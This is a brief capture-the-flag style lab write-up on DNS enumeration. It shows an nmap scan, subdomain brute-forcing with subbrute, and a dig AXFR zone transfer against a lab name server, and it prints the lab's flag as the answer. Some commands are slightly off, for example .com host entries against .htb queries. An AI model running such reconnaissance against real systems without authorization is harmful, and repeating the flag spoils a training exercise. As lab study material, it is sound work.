# DNS

### Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.

```bash
nmap -p53 -Pn -sV 10.129.203.6
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
```

lets prepare

```bash
sudo echo '10.129.203.6 inlanefreight.com' >> /etc/hosts
sudo echo '10.129.203.6 ns1.inlanefreight.com' >> /etc/hosts
sudo echo '10.129.203.6 ns2.inlanefreight.com' >> /etc/hosts
```

now we dig further

```bash
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
echo "ns2.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
hr.inlanefreight.htb
```

now we transfer it

```bash
dig AXFR @ns1.inlanefreight.htb hr.inlanefreight.htb
hr.inlanefreight.htb.   604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
hr.inlanefreight.htb.   604800  IN      TXT     "HTB{LUIHNFAS2871SJK1259991}"
hr.inlanefreight.htb.   604800  IN      NS      ns.inlanefreight.htb.
ns.hr.inlanefreight.htb. 604800 IN      A       127.0.0.1
hr.inlanefreight.htb.   604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
```

HTB{LUIHNFAS2871SJK1259991}
